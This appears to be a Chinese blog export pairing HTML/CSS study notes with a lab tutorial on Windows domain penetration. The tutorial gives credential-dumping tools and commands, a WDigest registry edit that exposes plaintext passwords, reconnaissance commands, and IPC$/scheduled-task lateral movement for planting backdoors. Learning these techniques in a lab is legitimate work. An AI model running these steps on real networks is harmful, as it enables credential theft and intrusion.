在需要的情况下出现滚动条（默认值）</p><p>yes 始终显示滚动条（即使不需要）</p><p>no  从不显示滚动条（即使需要）</p><p>④bordercolor</p><p>设置框架的边框颜色。</p><p>⑤frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>⑥noresize</p><p>设置框架大小是否能手动调节。</p><p>⑦marginwidth</p><p>设置框架边界和其中内容之间的宽度。</p><p>⑧marginhight</p><p>设置框架边界和其中内容之间的高度。</p><p>⑨width</p><p>设置框架宽度。</p><p>⑩height</p><p>设置框架高度。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235313862.png" alt="image-20220324235313862"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235247186.png" alt="image-20220324235247186"></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;frameset rows=&quot;50%,50%&quot;&gt;         &lt;frame src=&quot;https://nsl.lenovo.com.cn/&quot; scrolling=&quot;no&quot; /&gt;        &lt;frame src=&quot;http://www.sogou.com&quot; /&gt;    &lt;/frameset&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324224952975.png" alt="image-20220324224952975" style="zoom:50%;"><hr><h1 id="div-css"><a href="#div-css" class="headerlink" title="div css"></a>div css</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>DIV是html的一个标签 css是一个样式表</p><h2 id="样式表类型"><a href="#样式表类型" class="headerlink" title="样式表类型"></a>样式表类型</h2><h3 id="嵌入式样式表"><a href="#嵌入式样式表" class="headerlink" title="嵌入式样式表"></a>嵌入式样式表</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style&gt;            .demo01&#123;                color: mediumvioletred;                width: 1000px;                height: 500px;                background: salmon;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;demo01&quot;&gt;            人生若只如初见，何事秋风悲画扇        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325210711988.png" alt="image-20220325210711988"></p><h3 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h3><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;@import url@import url(&quot;g.css&quot;);.demo1&#123;                color: red;                width: 100px;                height: 100px;                background: blue;            &#125;</code></pre><p><strong>1、link直接引用</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325211849732.png" alt="image-20220325211849732"></p><p><strong>2、在外部再引用外部</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212537499.png" alt="image-20220325212537499"></p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212557848.png" alt="image-20220325212557848" style="zoom:50%;"><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><pre><code class="html">&lt;div style=&quot;color: blue;width: 100px;height: 100px; background: black;&quot;&gt;demo2&lt;/div&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325213538813.png" alt="image-20220325213538813"></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code class="html">/* */ 注释内容</code></pre><h2 id="样式选择器"><a href="#样式选择器" class="headerlink" title="样式选择器"></a>样式选择器</h2><pre><code class="html">元素选择器   div&#123;属性:值&#125;ID选择器  #id&#123;属性:值&#125;class选择器  .类名&#123;属性:值&#125;子选择器    元数 空格 元素&#123;属性:值&#125;后代选择器  元数 &gt; 元数&#123;属性:值&#125;属性选择器  元素[属性]&#123;&#125;通配符选择器  *&#123;属性:值&#125;群组选择器  把相同的元素写在一起</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220117278.png" alt="image-20220325220117278"></p><p><strong>通配符选择器示意</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220708388.png" alt="image-20220325220708388"></p><p><strong>群组选择器</strong></p><p>把相同的元素写在一起，减少重复代码</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325221110722.png" alt="image-20220325221110722"></p><p><strong>子选择器/后代选择器</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325222155359.png" alt="image-20220325222155359"></p><h2 id="背景和边框"><a href="#背景和边框" class="headerlink" title="背景和边框"></a>背景和边框</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>background-color   规定要使用的背景颜色。</p><p>background-position    规定背景图像的位置。    </p><p>background-size     规定背景图片的尺寸。    </p><p>background-repeat  规定如何重复背景图像。  </p><pre><code>repeat  默认。背景图像将在垂直方向和水平方向重复。repeat-x 背景图像将在水平方向重复。repeat-y 背景图像将在垂直方向重复。no-repeat   背景图像将仅显示一次。inherit  规定应该从父元素继承 background-repeat 属性的设置。</code></pre><p>background-origin  规定背景图片的定位区域。    </p><p>background-clip     规定背景的绘制区域。    </p><p>background-attachment  规定背景图像是否固定或者随着页面的其余部分滚动。    </p><pre><code class="html">背景图片的滚动背景图片是否随着内容的滚动而滚动由background-attachment设置background-attachment:fixed; 固定，不随内容的滚动而滚动background-attachment:scroll; 滚动，随内容的滚动而滚动</code></pre><p>background-image  规定要使用的背景图像。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224711431.png" alt="image-20220325224711431"></p><p>上述body可直接简写为</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224906687.png" alt="image-20220325224906687"></p><p>inherit  规定应该从父元素继承 background 属性的设置。  </p><p>left top</p><p>left center</p><p>left bottom</p><p>right top</p><p>right center</p><p>right bottom</p><p>center top</p><p>center center</p><p>center bottom</p><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>边框颜色 border-color:#000</p><p>边框宽度 border-width:1px;</p><p>border-left 设置左边框，一般单独设置左边框样式使用</p><p>border-right 设置右边框，一般单独设置右边框样式使用</p><p>border-top 设置上边框，一般单独设置上边框样式使用</p><p>border-bottom 设置下边框，一般单独设置下边框样式使用,有时可将下边框样式作为css下划线效果应用。</p><p><strong>边框样式值如下：</strong></p><p>none : 　无边框。与任何指定的border-width值无关</p><p>hidden : 　隐藏边框。IE不支持</p><p>dotted : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为点线。否则为实线（常用）</p><p>dashed : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为虚线。否则为实线（常用）</p><p>solid : 　实线边框（常用）</p><p>double : 　双线边框。两条单线与其间隔的和等于指定的border-width值</p><p><strong>上 右 下左：</strong></p><p>groove : 　根据border-color的值画3D凹槽</p><p>ridge : 　根据border-color的值画菱形边框</p><p>inset : 　根据border-color的值画3D凹边</p><p>outset : 　根据border-color的值画3D凸边</p><p><strong>上 右 下左 简写：</strong></p><p>border:5px solid red;</p><p> <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325231755509.png" alt="image-20220325231755509"></p><h2 id="文字属性"><a href="#文字属性" class="headerlink" title="文字属性"></a>文字属性</h2><p>color:red; 文字颜色 #ffeeees</p><p>font-size:12px; 文字大小</p><p>font-weight:bolds 文字粗细(bold/normal)</p><p>font-family:”宋体”文字字体</p><p>font-variant:small-caps小写字母以大写字母显示</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326001639314.png" alt="image-20220326001639314"></p><h2 id="文本属性-1"><a href="#文本属性-1" class="headerlink" title="文本属性"></a>文本属性</h2><p>text-align:center; 文本对齐(right/left/center)</p><p>line-height:10px; 行间距(可通过它实现文本的垂直居中)</p><p>text-indent:20px; 首行缩进</p><p>text-decoration:none;</p><p>文本线(none/underline/overline/line-through) underline/overline/line-through; 定义文本上的下划线/上划线/中划线</p><p>letter-spacing: 字间距</p><p>文本域示例:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326004753645.png" alt="image-20220326004753645"></p><h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>list-style-type   设置列表项标记的类型。参阅：list-style-type 中可能的值。</p><p>list-style-image 使用图像来替换列表项的标记。参阅：list-style-image 中可能的值。</p><p>inherit  规定应该从父元素继承 list-style 属性的值</p><pre><code>取值:​    disc: 点​    circle: 圆圈​    square: 正方形​    decimal: 数字​    decimal-leading-zero: 十进制数，不足两位的补齐前导0，例如: 01, 02, 03, ..., 98, 99​    lower-roman: 小写罗马文字，例如: i, ii, iii, iv, v, ...​    upper-roman: 大写罗马文字，例如: I, II, III, IV, V, ...​    lower-greek: 小写希腊字母，例如: α(alpha), β(beta), γ(gamma), ...​    lower-latin: 小写拉丁文，例如: a, b, c, ... z​    upper-latin: 大写拉丁文，例如: A, B, C, ... Z​    armenian: 亚美尼亚数字​    georgian: 乔治亚数字，例如: an, ban, gan, ..., he, tan, in, in-an, ...​    lower-alpha: 小写拉丁文，例如: a, b, c, ... z​    upper-alpha: 大写拉丁文，例如: A, B, C, ... Z​    none: 无(取消所有的list样式)​    inherit:继承</code></pre><p>list-style-position   设置在何处放置列表项标记。参阅：list-style-position 中可能的值。</p><pre><code>inside列表项目标记放置在文本以内，且环绕文本根据标记对齐。outside默认值。保持标记位于文本的左侧。列表项目标记放置在文本以外，且环绕文本不根据标记对齐。简写list-style:square inside url(&#39;/i/arrow.gif&#39;);</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326011302577.png" alt="image-20220326011302577"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><pre><code>a&#123;text-decoration: none;&#125;a:link &#123;color:#FF0000;&#125; /* 未访问的链接 */a:visited &#123;color:#00FF00;&#125; /* 已访问的链接 */a:hover &#123;color:#FF00FF;&#125; /* 鼠标划过链接 */a:active &#123;color:#0000FF;&#125; /* 已选中的链接 */</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326012956179.png" alt="image-20220326012956179"></p><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326171556178.png" alt="image-20220326171556178"></p><p>盒子模型的组成部分：</p><p>外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性</p><p>自身的身高:width height </p><p>内边距: padding</p><p>盒子边框:border</p><p>与其他盒子的距离 margin 外边距</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326172438006.png" alt="image-20220326172438006"></p><h2 id="border边框"><a href="#border边框" class="headerlink" title="border边框"></a>border边框</h2><p>常见的写法 border:1px solid #foo;</p><p>单独属性:</p><p>border-widh:</p><p>border-style:</p><pre><code>dotted 点状虚线dashed（虚线）solid（实线）double（双实线）border-color(颜色)</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326173422032.png" alt="image-20220326173422032"></p><h2 id="margin-padding"><a href="#margin-padding" class="headerlink" title="margin padding"></a>margin padding</h2><p>padding:内边距</p><p>值：像素/厘米等长度单位、百分比</p><p>padding:10px; 上下左右</p><p>padding:10px 10px; 上下 左右</p><p>padding:10px 10px 10px; 上 左右 下</p><p>padding:10px 10px 10px 10px; 上 右 下 左（设置4个点–&gt;顺时针方向）</p><p>单独属性</p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><p>当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据width和height减小</p><p>margin 外边距值：与padding相同</p><p> 单独属性：与padding相同 </p><p>外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并 </p><p>margin</p><p>margin:10px 上下左右都会腾出10px出来</p><p>margin:0px auto; 居中</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326175233023.png" alt="image-20220326175233023"></p><p><strong>让div和内容居中</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326180736898.png" alt="image-20220326180736898"></p><h2 id="float-脱离文档流浮动"><a href="#float-脱离文档流浮动" class="headerlink" title="float 脱离文档流浮动"></a>float 脱离文档流浮动</h2><p>left 元素向左浮动。</p><p>right 元素向右浮动</p><p>清除浮动:</p><pre><code>clear: both;leftright</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326210210962.png" alt="image-20220326210210962"></p><h2 id="块级元素行内元素"><a href="#块级元素行内元素" class="headerlink" title="块级元素行内元素"></a>块级元素行内元素</h2><p><strong>块级元素</strong></p><p>他会独占一行，在默认情况下，其宽度自动填满其父元素的宽度；</p><p>块级元素可以设置width、height属性；</p><p>块级元素即使设置了宽度也是独占一行，块级元素可以设置margin、padding属性</p><p><strong>行内元素</strong></p><p>行内元素不会独占一行，相邻的行内元素会排列在同一行里，直到行排不下，就自动换行，其宽度随内容而变化；</p><p>行内元素的width、height属性则无效；</p><p>行内元素的margin、padding属性很奇怪，水平方向的padding-left、padding-rigtht、margin-left、padding-right都会产生边距效果，但是竖直方向的padding-top、padding-bottom、margin-top、margin-bottom却不产生边距效果。</p><p><strong>块级元素(block element)</strong></p><pre><code>address 地址center 举中对齐块div- 常用块级容易dl 定义列表form 交互表单 （只能用来容纳其它块元素）h标签hr 水平分隔线ol 无需列表ul有序列表p 段落pre 格式化文本</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326211940013.png" alt="image-20220326211940013"></p><p><strong>行内元素转换</strong></p><pre><code>display:none; 不显示display:block;变成块级元素display:inline; 变成行内元素display:inline-block;以块级元素样式展示，以行级元素样式排列</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326212608009.png" alt="image-20220326212608009"></p><p>两个块级元素此时在同一行了</p><p><strong>行内元素溢出处理</strong></p><pre><code>overflow 属性规定当内容溢出元素框时发生的事情：visible    默认值。内容不会被修剪，会呈现在元素框之外。hidden    内容会被修剪，并且其余内容是不可见的。scroll    内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。auto    如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。inherit    规定应该从父元素继承 overflow 属性的值。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214145022.png" alt="image-20220326214145022"></p><p>我们可以看到此时元素超出的边框</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214302027.png" alt="image-20220326214302027"></p><p>添加overflow后会增加一个拖动条</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><pre><code>positionstatic静态定位（不对它的位置进行改变，在哪里就在那里）默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者z-index 声明）。fixed固定定位（参照物--浏览器窗口）---做 弹窗广告用到生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot;以及 &quot;bottom&quot;属性进行规定。relative（相对定位 ）（参照物以他本身）生成相对定位的元素，相对于其正常位置进行定位。absolute（绝对定位）(除了static都可以，找到参照物--&gt;与它最近的已经有定位的父元素进行定位)生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定z-indexz-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220327005012845.png" alt="image-20220327005012845"></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
          <category> html </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透篇</title>
      <link href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/"/>
      <url>/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h1><p>实验环境:</p><p>win2008 域控       本地管理员密码:0801.com  域密码:yk2008.com    ip:192.168.137.2     </p><p>win 2008 域成员  本地管理员密码:0802.com  域密码:yc2008.com    ip:192.168.137.66</p><p>win 2003 域成员  本地管理员密码:0301.com  域密码: yc2003.com    ip:192.168.137.99</p><p><strong>配置域控2008</strong></p><p>使用vm1网卡</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p><p>配置ip</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p><p>找到服务器管理器</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p><p>一直下一步，然后安装</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p><p>安装成功</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p><p>运行dcpromo程序:</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p><p>一直下一步，到这里新建域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p><p>命名林根域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p><p>选择2008 R2</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p><p>一直下一步/默认是，到这一步设置密码为:yk2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p><p>一直下一步</p><p>完成了域控的配置，并重启</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p><p>重启后，有域的标识出现，我们使用前文设置的域控密码登录</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p><p>进入后</p><p>打开域管理中心</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p><p>打开用户和计算机，新建组织hack</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p><p>在这个组分别建立server2003用户和server2008用户，设置域密码分别为 yc2003.com和yc2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p><p>到这里域控的配置就完成了，接下来就让域成员加入域</p><p>进入windows2003</p><p>更改计算机名加入域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p><p>windows2008同理</p><p>然后重启</p><p>输入加入域的计算机名</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p><p>成功登入</p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;"><p>我们在域控中就能看到两台计算机上线</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p><p>域环境就搭建好了</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><strong>基本信息收集：</strong></p><p>了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p><pre><code>systeminfo 详细信息net start 启动服务tasklist 进程列表schtasks 计划任务</code></pre><p><strong>网络信息收集:</strong></p><p>了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><pre><code>ipconfig /all 判断存在域-dnsnet view /domain 判断存在域net time /domain 判断主域netstat -ano 当前网络端口开放nslookup 域名 追踪来源地址</code></pre><p><strong>用户信息收集:</strong></p><p>了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><pre><code>Domain Admins：域管理员（默认对域控制器有完全控制权）Domain Computers：域内机器Domain Controllers：域控制器Domain Guest：域访客，权限低Domain Users：域用户Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）相关用户收集操作命令：whoami /all 用户权限net config workstation 登录信息net user 本地用户net localgroup 本地用户组net user /domain 获取域用户信息net group /domain 获取域用户组信息wmic useraccount get /all 涉及域用户详细信息net group &quot;Domain Admins&quot; /domain 查询域管理员账户net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组net group &quot;Domain Controllers&quot; /domain 查询域控制器</code></pre><p><strong>凭据信息收集操作:</strong></p><p>收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><pre><code>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)Netsh WLAN show profilesNetsh WLAN show profile name=&quot;无线名称&quot; key=clear1.站点源码备份文件、数据库备份文件等2.各类数据库 Web 管理入口，如 PHPMyAdmin3.浏览器保存密码、浏览器 Cookies4.其他用户会话、3389 和 ipc$连接记录、回收站内容5.Windows 保存的 WIFI 密码6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</code></pre><p><strong>探针主机域控架构服务:</strong></p><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><pre><code>探针域控制器名及地址信息net time /domain nslookup ping探针域内存活主机及地址信息nbtscan 192.168.3.0/24 第三方工具for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令nmap masscan 第三方 PowerShell 脚本 nishang empire 等#导入模块 nishangImport-Module .\nishang.psm1#设置执行策略Set-ExecutionPolicy RemoteSigned#获取模块 nishang 的命令函数Get-Command -Module nishang#获取常规计算机信息Get-Information#端口扫描（查看目录对应文件有演示语法，其他同理）Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort#其他功能：删除补丁，反弹 Shell，凭据获取等探针域内主机角色及服务信息利用开放端口服务及计算机名判断核心业务机器:1.高级管理人员、系统管理员、财务/人事/业务人员的个人计算机2.产品管理系统服务器3.办公系统服务器4.财务应用系统服务器5.核心产品源码服务器（自建 SVN、GIT）6.数据库服务器7.文件或网盘服务器、共享服务器8.电子邮件服务器9.网络监控系统服务器10.其他服务器（内部技术文档服务器、其他监控服务器等）</code></pre><h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p><h2 id="域横向必备知识点"><a href="#域横向必备知识点" class="headerlink" title="域横向必备知识点"></a><strong>域横向必备知识点</strong></h2><p><strong>知识点1：</strong><br>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码<br>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p><pre><code>针对以上情况，我们提供了4种方式解决此类问题1.利用哈希 hash 传递(pth，ptk等)进行移动2.利用其它服务协议(SMB,WMI等)进行哈希移动3.利用注册表操作开启Wdigest Auth值进行获取4.利用工具或第三方平台(Hachcat)进行破解获取</code></pre><pre><code>#注册表操作开启Wdigest Auth值reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p><strong>知识点2：</strong><br>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><pre><code>#获取win密码hash的两个工具Pwdump7QuarksPwdump</code></pre><p><strong>知识点3：</strong><br>域用户与本地用户的区别<br>比如，<code>god/administrator</code>是域用户，<code>./administrator</code>是本地用户</p><h2 id="at-amp-amp-schtasks-密码是明文"><a href="#at-amp-amp-schtasks-密码是明文" class="headerlink" title="at&amp;&amp;schtasks(密码是明文)"></a><strong>at&amp;&amp;schtasks(密码是明文)</strong></h2><p><strong>优点:官方自带命令，不会被杀</strong></p><p><strong>缺点:命令比较繁琐，且只支持明文密码</strong></p><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 这里介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主 机上执行命令</p><p>获取到某域主机权限–&gt;minikatz 得到密码（明文，hash）–&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典–&gt;尝试连接–&gt;创建计划任务(at|schtasks)–&gt;执行文件可为后门或者相关命令</p><p>利用流程:</p><ol><li>建立 IPC 链接到目标主机 (目标主机要开启135，445)</li><li> 拷贝要执行的命令脚本到目标主机 </li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本 </li><li> 删除 IPC 链接 </li></ol><pre><code>net use \\server\ipc$&quot;password&quot; /user:username # 工作组 net use \\server\ipc$&quot;password&quot; /user:domain\username #域内 dir \\xx.xx.xx.xx\C$\ # 查看文件列表 copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件 copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件 net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 IPC net view xx.xx.xx.xx # 查看对方共享 #建立 IPC 常见的错误代码 （1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 （2）51：网络问题，Windows 无法找到网络路径 （3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题 （4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$ （5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除 （6）1326：账号密码错误 （7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况 （8）2242：用户密码过期，目标有账号策略，强制定期更改密码 #建立 IPC 失败的原因 （1）目标系统不是 NT 或以上的操作系统 （2）对方没有打开 IPC$共享 （3）对方未开启 139、445 端口，或者被防火墙屏蔽 